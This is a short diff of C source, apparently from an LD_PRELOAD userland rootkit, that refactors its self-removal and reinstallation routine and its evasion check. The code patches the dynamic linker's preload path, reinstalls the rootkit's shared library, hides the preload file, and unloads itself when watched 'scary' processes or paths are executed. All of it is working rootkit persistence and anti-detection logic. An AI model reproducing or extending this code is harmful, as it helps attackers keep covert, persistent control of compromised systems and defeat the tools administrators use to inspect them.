@@ -17,16 +17,15 @@ int remove_self(void){
     pid_t pid = fork();
     if(pid < 0) return VFORK_ERR;
     else if(pid == 0) return VFORK_SUC;
-
     wait(NULL);
+
+    char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
-    ldpatch(OLD_PRELOAD, PRELOAD_FILE);
-    reinstall(PRELOAD_FILE, INSTALL_DIR, BDVLSO);
-    hide_path(PRELOAD_FILE);
-#else
-    reinstall(OLD_PRELOAD, INSTALL_DIR, BDVLSO);
-    hide_path(OLD_PRELOAD);
+    preloadpath = PRELOAD_FILE;
+    ldpatch(OLD_PRELOAD, preloadpath);
 #endif
+    reinstall(preloadpath, INSTALL_DIR, BDVLSO);
+    hide_path(preloadpath);
     return VEVADE_DONE;
 }
 
@@ -34,8 +33,7 @@ int remove_self(void){
 /* checks all of the scary_* arrays created by setup.py against execve/p args.
  * the scary_procs loop checks the name of the calling process as well. */
 int evade(const char *filename, char *const argv[], char *const envp[]){
-    if(rknomore(INSTALL_DIR, BDVLSO))
-        return VNOTHING_DONE;
+    if(rknomore()) return VNOTHING_DONE;
 
     char *scary_proc, *scary_path;
 
